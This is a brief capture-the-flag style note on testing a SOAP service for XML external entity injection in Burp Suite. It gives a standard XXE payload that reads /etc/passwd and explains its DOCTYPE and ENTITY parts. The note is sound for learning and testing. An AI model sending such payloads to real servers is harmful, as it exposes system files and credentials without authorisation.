SOAP - Check for XXE
=====
In burpsuite > This is what I put in the body >
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>
    <ID>
    &xxe;
    </ID>
  </data>
This is just one of the standard xxe payloads available online >
This !DOCTYPE = document type, foo !ENTITY creates entity named "xxe" then SYSTEM "file/path/" tells XML parser to replace
any instance of &xxe; in the XML document with the contents of the file located at "file/path".
Inspect the response to find the flag.
"foo" and "xxe" can be anything, they're just names
